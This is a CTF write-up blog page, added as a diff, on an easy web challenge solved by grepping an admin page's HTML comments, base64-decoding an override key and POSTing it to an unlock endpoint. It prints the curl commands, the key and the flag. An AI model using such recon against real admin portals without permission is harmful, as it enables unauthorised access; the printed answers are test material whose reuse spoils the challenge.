@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="An R1-era admin portal with the override key base64-encoded in an HTML comment. Decode the comment, POST the key, get the flag. snack_con S2R1 web challenge.">
+  <meta name="theme-color" content="#0a0a0f">
+  <title>Freezer Aisle | Hack the Cube</title>
+
+  <meta property="og:title" content="Freezer Aisle - Hack the Cube">
+  <meta property="og:description" content="Back freezer, R1 origin era. Someone taped the override code to the inside of the door and forgot about it.">
+  <meta property="og:image" content="/blog/posts/web-freezer-aisle/images/header.png">
+  <meta property="og:type" content="article">
+  <meta property="article:published_time" content="2026-05-01T00:00:00Z">
+
+  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
+</head>
+<body>
+  <div class="blog-container">
+
+    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
+      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
+        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
+          &lt; HACK THE CUBE
+        </span>
+      </a>
+    </header>
+
+    <header class="post-header">
+      <h1 class="post-title">Freezer Aisle</h1>
+
+      <div class="post-meta">
+        <div class="post-meta-item">
+          <span class="post-meta-label">Date:</span>
+          <span>May 1, 2026</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Difficulty:</span>
+          <span class="post-difficulty easy">Easy</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Category:</span>
+          <span>WEB</span>
+        </div>
+        <div class="post-meta-item solve-time">
+          <span class="post-meta-label">SOLVE TIME:</span>
+          <span class="time-value">~00:14:00</span>
+        </div>
+      </div>
+
+            <picture>
+        <source
+          type="image/webp"
+          srcset="/blog/posts/web-freezer-aisle/images/header-800w.webp 800w,
+                 /blog/posts/web-freezer-aisle/images/header-1200w.webp 1200w,
+                 /blog/posts/web-freezer-aisle/images/header.webp 2048w"
+          sizes="(max-width: 800px) 100vw, 1200px"
+        >
+        <img
+          src="/blog/posts/web-freezer-aisle/images/header.png"
+          alt="Freezer Aisle - Walk-in freezer ajar with override sticky note taped inside, Cave Johnson exasperated, GlaDOS observing"
+          class="post-header-image"
+          loading="eager"
+          width="2048" height="1152"
+        >
+      </picture>
+
+      <div class="tags-container" style="justify-content: center;">
+        <a href="/blog/tags/tag.html?tag=ctf" class="tag">ctf</a>
+        <a href="/blog/tags/tag.html?tag=snack-con" class="tag">snack-con</a>
+        <a href="/blog/tags/tag.html?tag=s2r1" class="tag">s2r1</a>
+        <a href="/blog/tags/tag.html?tag=easy" class="tag">easy</a>
+        <a href="/blog/tags/tag.html?tag=web" class="tag">web</a>
+        <a href="/blog/tags/tag.html?tag=recon" class="tag">recon</a>
+        <a href="/blog/tags/tag.html?tag=base64" class="tag">base64</a>
+        <a href="/blog/tags/tag.html?tag=admin-panel" class="tag">admin-panel</a>
+        <a href="/blog/tags/tag.html?tag=glados" class="tag glados">glados</a>
+        <a href="/blog/tags/tag.html?tag=cavejohnson" class="tag cave">cavejohnson</a>
+      </div>
+
+      <div class="post-characters">
+        <span class="post-meta-label">Guides:</span>
+        <span class="character-glados">GlaDOS</span>,
+        <span class="character-cave">Cave Johnson</span>
+      </div>
+    </header>
+
+    <main class="post-content">
+
+      <h2>The Door That Was Already Unlocked</h2>
+
+      <p>The brief read like a confession: <em>"Back freezer, R1 origin era (2025). Someone taped the override code to the inside of the door and forgot about it. First of six doors at the Back Counter."</em> A link pointed at <code>/admin/</code>. 100 points. Easy. First of six in the Web track.</p>
+
+      <p>When a CTF brief tells you exactly what kind of carelessness you're looking for, the only remaining question is: how lazy was the developer who left the key behind? In this case &mdash; <em>extremely</em> lazy.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"This is the part of the test where we evaluate whether the test subject can read. Not metaphorically. Literally. Can you look at a webpage. The challenge brief named the bug class, the location, and the era. There was perhaps one piece of plausible deniability left, and the developer chose to remove it."</div>
+      </div>
+
+      <h2>View-Source Surgery</h2>
+
+      <p>Step one in any web challenge that says "look around the portal" is exactly that &mdash; pull the raw HTML and read it. No browser, no JS execution, no animated DOM trickery. Just bytes.</p>
+
+      <div class="terminal-log">$ SID="6d131a47-..."
+$ curl -s -A "Mozilla/5.0" \
+    -H "X-Session-Id: $SID" \
+    -H "Cookie: ctf_session=$SID" \
+    "https://snackspacecon.com/admin/" -o admin_index.html
+$ wc -c admin_index.html
+   47093 admin_index.html</div>
+
+      <p>47KB of admin portal. The page renders six "case files" &mdash; one for each of the six Web challenges. The Frozen Stock card had everything I needed:</p>
+
+      <div class="terminal-log">Expected param:    ?thaw=&lt;override-code&gt;
+Location of override code:   check HTML &lt;head&gt; source comments</div>
+
+      <p>So the page itself was instructing the player to grep its own <code>&lt;head&gt;</code> for comments. One <code>grep</code> later:</p>
+
+      <div class="terminal-log">$ grep -oE '&lt;!--[^&gt;]*--&gt;' admin_index.html
+&lt;!-- VAULT-COMMENT: P3RoYXc9MjAyNS1SMS1PUklHSU4tS0VZ --&gt;</div>
+
+      <div class="dialogue cave">
+        <div class="dialogue-speaker">Cave Johnson</div>
+        <div class="dialogue-text">"Let me get this straight. We have an admin portal. On the public internet. With an override code. And someone &mdash; some <em>genius</em> &mdash; decided the right place to store that override code was an HTML COMMENT. In the SOURCE. That every browser ships with a 'view source' button for. Tell whoever wrote this that R&amp;D is sending them a fruit basket. Then fire them. In that order."</div>
+      </div>
+
+      <h2>The Sticky Note</h2>
+
+      <p>The comment value is the hint &mdash; literally. <code>P3R</code> is the base64 fingerprint of <code>?t</code>. Once you've seen it twice, you read the leading characters of base64 strings the way you read license plates.</p>
+
+      <div class="terminal-log">$ echo 'P3RoYXc9MjAyNS1SMS1PUklHSU4tS0VZ' | base64 -d
+?thaw=2025-R1-ORIGIN-KEY</div>
+
+      <p>The page told us the param name: <code>thaw</code>. The decoded comment confirmed it and supplied the value: <code>2025-R1-ORIGIN-KEY</code>. The developers had thoughtfully embedded the entire query-string fragment in the comment, in case the player got confused about which part of the equals sign held the value.</p>
+
+      <h2>Skipping the Door, Picking the Lock</h2>
+
+      <p>The intended flow was: visit <code>/admin/?thaw=2025-R1-ORIGIN-KEY</code>, click "PRY THE DOOR," watch the React-y unlock animation. But the JS bundle gave away the actual mechanism:</p>
+
+      <div class="terminal-log">// /admin/challenge-logic.js
+// 01 Freezer Aisle &mdash; Clue: VAULT-COMMENT decodes to `?thaw=&lt;key&gt;`.
+document.getElementById('cold-thaw-btn').addEventListener('click', async () =&gt; {
+    const k = new URL(location.href).searchParams.get('thaw');
+    await handleUnlock('cold', 'freezer_aisle', k);
+});
+// &rarr; POST /api/s2/web-hex/unlock {door, keyCandidate}
+// Server hashes, compares, returns flag in response.</div>
+
+      <p>One POST. No browser required. Skip the animation, hit the endpoint directly:</p>
+
+      <div class="terminal-log">$ curl -s -A "Mozilla/5.0" \
+    -H "X-Session-Id: $SID" \
+    -H "Cookie: ctf_session=$SID" \
+    -H "Content-Type: application/json" \
+    -X POST \
+    -d '{"door":"freezer_aisle","keyCandidate":"2025-R1-ORIGIN-KEY"}' \
+    "https://snackspacecon.com/api/s2/web-hex/unlock"
+{
+    "ok": true,
+    "flag": <span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">"The flag is a lie"</span><span class="flag-revealed">"CTF{c0ld_st0r4g3_m3lts_f4st}"</span></span>
+}</div>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Cold storage melts fast. The flag has a sense of humor about itself. The seal on this challenge was held together by a single base64-encoded sticky note &mdash; which, to be fair, is approximately the threshold of effort most production developers apply to abandoned admin tooling. We did not break in. We let ourselves in."</div>
+      </div>
+
+      <h2>What I Learned</h2>
+
+      <p>Three takeaways from the easiest door in a six-stage Web track:</p>
+
+      <p><strong>HTML comments are not invisible.</strong> They are part of the response body, served to every requester, regardless of authentication. Treat them as load-bearing data. The first thing to do on any web page that smells like a challenge is <code>grep '&lt;!--'</code> &mdash; or its equivalent in the inspector. Comments are where developers stash todo notes, debugging stubs, and, occasionally, override keys.</p>
+
+      <p><strong>Read base64 by sight.</strong> The character set <code>[A-Za-z0-9+/=]</code>, length divisible by 4, no whitespace, no separators. <code>P3R</code> at the start means the decoded text starts with <code>?t</code>. <code>SFRU</code> means <code>HTT</code> (likely a URL). <code>eyJ</code> means <code>{"</code> (likely JSON, often a JWT). These three fingerprints alone cover most of what you'll see in the wild.</p>
+
+      <p><strong>JS bundles are documentation.</strong> Pulling <code>challenge-logic.js</code> didn't just confirm the unlock flow &mdash; it pre-leaked the bug class for all five remaining stages of the Web track. Storage tier reassembly, JWT tier-field tampering, client-side redactor, prototype pollution, DOM XSS into <code>window.vaultConfig.finalKey</code>. The developers wrote a roadmap and shipped it next to the maze.</p>
+
+      <p>The flag: <span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">CTF{c0ld_st0r4g3_m3lts_f4st}</span></span></p>
+
+      <aside class="attack-path">
+        <h3>Attack Path Summary</h3>
+        <ol>
+          <li>Curl <code>/admin/</code> with session auth &mdash; 47KB of HTML</li>
+          <li>Grep for HTML comments &mdash; one stood out: <code>VAULT-COMMENT: P3Ro...</code></li>
+          <li>Read the on-page hint: <code>?thaw=&lt;override-code&gt;</code>, "check HTML head source comments"</li>
+          <li>Base64-decode the comment &rarr; <code>?thaw=2025-R1-ORIGIN-KEY</code></li>
+          <li>Pull <code>challenge-logic.js</code> to confirm the unlock endpoint &mdash; <code>POST /api/s2/web-hex/unlock</code></li>
+          <li>POST <code>{door:"freezer_aisle",keyCandidate:"2025-R1-ORIGIN-KEY"}</code> &rarr; flag in response</li>
+        </ol>
+      </aside>
+
+    </main>
+
+    <nav class="post-nav">
+      <a href="/blog/posts/chipsweeper-tier3/" class="post-nav-link prev">CHIPSWEEPER Tier 3</a>
+    </nav>
+
+    <footer class="blog-footer">
+      <p class="footer-text">
+        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
+      </p>
+      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
+        For science. You monster.
+      </p>
+    </footer>
+
+  </div>
+</body>
+</html>
